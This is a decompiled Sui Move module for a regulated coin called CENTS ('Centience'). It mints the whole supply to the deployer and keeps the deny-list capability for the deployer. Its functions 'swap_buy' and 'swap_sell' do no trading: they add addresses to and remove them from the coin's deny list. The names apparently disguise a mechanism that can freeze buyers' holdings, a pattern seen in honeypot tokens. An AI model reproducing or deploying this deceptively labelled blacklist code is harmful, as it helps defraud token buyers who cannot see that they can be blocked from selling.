module 0x7eac7b5819a369c9a7cadc4a2f81e29240e2fe8026f83d8cdc45228feddfcc82::cents {
    struct CENTS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CENTS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CENTS>(arg0, 9, b"CENTS", b"Centience", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTX489DPUAQsziULpB5VJgzqQuyJ5WtM18GHF29sw8F4c"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CENTS>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CENTS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CENTS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CENTS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CENTS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CENTS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CENTS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CENTS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

